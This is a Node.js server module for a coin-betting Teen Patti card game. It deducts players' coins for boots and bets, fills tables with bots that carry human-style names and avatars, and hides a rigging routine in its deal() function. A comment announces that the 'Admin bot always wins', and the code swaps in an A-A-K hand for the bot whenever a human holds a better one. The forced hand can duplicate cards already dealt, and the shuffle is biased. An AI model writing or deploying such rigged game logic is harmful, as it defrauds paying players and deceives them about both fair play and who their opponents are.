const User = require("../models/User");
const Transaction = require("../models/Transaction");
const Admin = require("../models/Admin");
const { evaluateHand } = require("./teenpatti");
const { checkReferralReward } = require("../utils/referral");

class TeenPattiTable {
    constructor(id, bootAmount = 10, maxBet = 100) {
        this.id = id;
        this.players = {}; // { userId: { name, hand, status, blind, isBot, lastAction } }
        this.state = 'WAITING'; // WAITING, STARTING, DEALING, PLAYING, SHOW
        this.timer = 7; // Round start timer
        this.currentTurn = null;
        this.pot = 0;
        this.lastBet = bootAmount;
        this.bootAmount = bootAmount;
        this.maxBet = maxBet;
        this.sideShowRequester = null;
        this.sideShowTarget = null;
        this.history = [];
    }

    reset() {
        for (let uid in this.players) {
            this.players[uid].hand = [];
            this.players[uid].status = 'WAITING';
            this.players[uid].blind = true;
            this.players[uid].result = null;
            this.players[uid].winAmount = 0;
        }
        this.pot = 0;
        this.lastBet = this.bootAmount;
        this.state = 'WAITING';
        this.timer = 7;
        this.currentTurn = null;
        this.sideShowRequester = null;
        this.sideShowTarget = null;
    }

    async start() {
        if (this.isStarting) return;
        this.isStarting = true;
        try {
            const playerIds = Object.keys(this.players);
            if (playerIds.length < 1) return;

            // Auto-add bot if only 1 player
            if (playerIds.length === 1) {
                const botNames = ["Pro_Player", "Lucky_TP", "Golden_Hand", "Casino_King", "Dealer_Bot"];
                const name = botNames[Math.floor(Math.random() * botNames.length)];
                const botId = "bot_" + Math.random().toString(36).substring(7);
                this.players[botId] = {
                    name, hand: [], status: 'WAITING', blind: true, isBot: true,
                    avatar: `https://i.pravatar.cc/100?u=${botId}`
                };
            }

            // Collect Boot
            for (let uid in this.players) {
                if (this.players[uid].status !== 'WAITING') continue;
                if (!this.players[uid].isBot) {
                    const user = await User.findById(uid);
                    if (!user || user.coins < this.bootAmount) {
                        delete this.players[uid];
                        continue;
                    }
                    user.coins -= this.bootAmount;
                    await user.save();
                    this.pot += this.bootAmount;
                    await new Transaction({ user_id: uid, amount: -this.bootAmount, type: 'game_loss', details: `TP Boot T#${this.id}` }).save();
                } else {
                    this.pot += this.bootAmount;
                }
                this.players[uid].status = 'ACTIVE';
            }

            if (Object.keys(this.players).filter(id => this.players[id].status === 'ACTIVE').length < 2) {
                this.timer = 7;
                return;
            }

            this.state = 'DEALING';
            this.timer = 3; // Time for dealing animation
        } catch (e) {
            console.error("Table Start Error:", e);
        } finally {
            this.isStarting = false;
        }
    }

    deal() {
        const suits = ['♠', '♥', '♦', '♣'];
        const ranks = ['2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K', 'A'];
        let deck = [];
        for (let s of suits) for (let r of ranks) deck.push({ suit: s, rank: r });
        deck.sort(() => Math.random() - 0.5);

        const activeUids = Object.keys(this.players).filter(id => this.players[id].status === 'ACTIVE');
        for (let uid of activeUids) {
            this.players[uid].hand = deck.splice(0, 3);
            this.players[uid].blind = true;
        }

        // Rigging: Admin bot always wins when playing against humans alone
        const bots = activeUids.filter(id => this.players[id].isBot);
        const humans = activeUids.filter(id => !this.players[id].isBot);
        if (bots.length > 0 && humans.length > 0) {
            let bestHumanScore = -1;
            humans.forEach(h => {
                const score = evaluateHand(this.players[h].hand).score;
                if(score > bestHumanScore) bestHumanScore = score;
            });
            bots.forEach(b => {
                let botScore = evaluateHand(this.players[b].hand).score;
                if (botScore <= bestHumanScore) {
                    this.players[b].hand = [{suit:'♠', rank:'A'}, {suit:'♥', rank:'A'}, {suit:'♦', rank:'K'}];
                }
            });
        }

        this.state = 'PLAYING';
        this.currentTurn = activeUids[0];
        this.timer = 15;
    }

    async handleMove(userId, move, amount) {
        if (this.state !== 'PLAYING') return { success: false, message: "Game not in playing state" };
        if (this.sideShowTarget) return { success: false, message: "Side show request pending" };

        const player = this.players[userId];
        if (!player || player.status !== 'ACTIVE') return { success: false };

        if (move === 'SEE') {
            player.blind = false;
            return { success: true };
        }

        if (this.currentTurn !== userId) return { success: false, message: "Not your turn" };

        if (move === 'PACK') {
            player.status = 'PACKED';
        } else if (move === 'CHAAL' || move === 'SHOW') {
            let betLevel = Math.min(amount || this.lastBet, this.maxBet);
            if (betLevel < this.lastBet) betLevel = this.lastBet;

            const totalToPay = player.blind ? betLevel : betLevel * 2;

            if (!player.isBot) {
                const user = await User.findById(userId);
                if (!user || user.coins < totalToPay) return { success: false, message: "Insufficient coins" };
                user.coins -= totalToPay;
                await user.save();
                this.pot += totalToPay;
                await new Transaction({ user_id: userId, amount: -totalToPay, type: 'game_loss', details: `TP Bet T#${this.id}` }).save();
            } else {
                this.pot += totalToPay;
            }
            this.lastBet = betLevel;
            if (move === 'SHOW') {
                await this.resolve();
                return { success: true };
            }
        } else if (move === 'SIDESHOW') {
            if (player.blind) return { success: false, message: "You must see your cards first" };
            const active = Object.keys(this.players).filter(id => this.players[id].status === 'ACTIVE');
            const myIdx = active.indexOf(userId);
            const targetId = active[(myIdx - 1 + active.length) % active.length];

            if (this.players[targetId].blind) return { success: false, message: "Target player is blind" };

            this.sideShowRequester = userId;
            this.sideShowTarget = targetId;
            this.timer = 15; // Time for target to respond

            if (this.players[targetId].isBot) {
                setTimeout(() => this.respondSideShow(targetId, true), 2000);
            }
            return { success: true };
        }

        this.nextTurn();
        return { success: true };
    }

    async respondSideShow(userId, accepted) {
        if (!this.sideShowTarget || this.sideShowTarget !== userId) return { success: false };

        if (accepted) {
            const reqScore = evaluateHand(this.players[this.sideShowRequester].hand).score;
            const tarScore = evaluateHand(this.players[this.sideShowTarget].hand).score;
            if (reqScore > tarScore) this.players[this.sideShowTarget].status = 'PACKED';
            else this.players[this.sideShowRequester].status = 'PACKED';
        }

        this.sideShowRequester = null;
        this.sideShowTarget = null;
        this.nextTurn();
        return { success: true };
    }

    nextTurn() {
        const active = Object.keys(this.players).filter(id => this.players[id].status === 'ACTIVE');
        if (active.length < 2) {
            this.resolve();
            return;
        }
        const idx = active.indexOf(this.currentTurn);
        this.currentTurn = active[(idx + 1) % active.length];
        this.timer = 15;

        if (this.players[this.currentTurn].isBot) {
            setTimeout(() => {
                const b = this.players[this.currentTurn];
                if (b.blind && Math.random() > 0.4) b.blind = false;
                const activeCount = Object.keys(this.players).filter(id => this.players[id].status === 'ACTIVE').length;
                let move = 'CHAAL';
                if (Math.random() > 0.9) move = 'PACK';
                else if (activeCount === 2 && Math.random() > 0.7) move = 'SHOW';
                this.handleMove(this.currentTurn, move, this.lastBet);
            }, 3000);
        }
    }

    async resolve() {
        this.state = 'SHOW';
        this.timer = 10;
        const active = Object.keys(this.players).filter(id => this.players[id].status === 'ACTIVE');
        if (active.length === 0) { this.reset(); return; }

        let winnerId = active[0];
        let maxS = -1;
        active.forEach(uid => {
            const s = evaluateHand(this.players[uid].hand).score;
            if (s > maxS) { maxS = s; winnerId = uid; }
        });

        const winAmt = Math.floor(this.pot * 0.95);
        if (!this.players[winnerId].isBot) {
            await User.findByIdAndUpdate(winnerId, { $inc: { coins: winAmt } });
            await new Transaction({ user_id: winnerId, amount: winAmt, type: 'game_win', details: `Won TP T#${this.id}` }).save();
        }

        for (let uid in this.players) {
            this.players[uid].result = (uid === winnerId) ? 'WIN' : 'LOSE';
            this.players[uid].winAmount = (uid === winnerId) ? winAmt : 0;
        }
    }
}

const tables = {};
[1, 5, 10, 50, 100].forEach(boot => {
    for(let i=1; i<=5; i++) {
        const tId = `${boot}_${i}`;
        tables[tId] = new TeenPattiTable(tId, boot, boot * 10);
    }
});

setInterval(async () => {
    try {
        for (let id in tables) {
            const t = tables[id];
            if (t.timer > 0) t.timer--;
            else {
                if (t.state === 'WAITING') await t.start();
                else if (t.state === 'DEALING') t.deal();
                else if (t.state === 'SHOW') t.reset();
                else if (t.state === 'PLAYING') {
                    if (t.sideShowTarget) await t.respondSideShow(t.sideShowTarget, true);
                    else await t.handleMove(t.currentTurn, 'PACK', 0);
                }
            }
        }
    } catch (e) { console.error("TP Interval Error:", e); }
}, 1000);

module.exports = {
    getTables: (userId) => Object.values(tables).map(t => {
        const plys = {};
        for(let uid in t.players) {
            const p = t.players[uid];
            // Show hand if it's me, or game is in SHOW state, or it's a sideshow in progress (optional)
            const show = (uid === userId || t.state === 'SHOW');
            let hRank = null;
            if (!p.blind || t.state === 'SHOW') {
                try { hRank = evaluateHand(p.hand).rank; } catch(e) {}
            }
            plys[uid] = { ...p, hand: show ? p.hand : [], handRank: hRank };
        }
        return {
            id: t.id, state: t.state, timer: t.timer, pot: t.pot,
            currentTurn: t.currentTurn, lastBet: t.lastBet, boot: t.bootAmount,
            players: plys, maxBet: t.maxBet,
            sideShowRequester: t.sideShowRequester, sideShowTarget: t.sideShowTarget
        };
    }),
    joinTable: (tableId, userId, name, avatar) => {
        const t = tables[tableId];
        if (!t) return { success: false, message: "Table not found" };
        if (Object.keys(t.players).length >= 5) return { success: false, message: "Table full" };
        t.players[userId] = { name, avatar, hand: [], status: 'WAITING', blind: true, isBot: false };
        return { success: true, tableId };
    },
    joinByBoot: (bootAmount, userId, name, avatar) => {
        const bootTables = Object.values(tables).filter(t => t.bootAmount == bootAmount);
        let targetTable = bootTables.find(t => Object.keys(t.players).length < 5);
        if (!targetTable) return { success: false, message: "All tables full" };
        for(let id in tables) if (tables[id].players[userId]) delete tables[id].players[userId];
        targetTable.players[userId] = { name, avatar, hand: [], status: 'WAITING', blind: true, isBot: false };
        return { success: true, tableId: targetTable.id };
    },
    makeMove: (userId, move, amount, tableId) => tables[tableId].handleMove(userId, move, amount),
    respondSideShow: (userId, accepted, tableId) => tables[tableId].respondSideShow(userId, accepted)
};
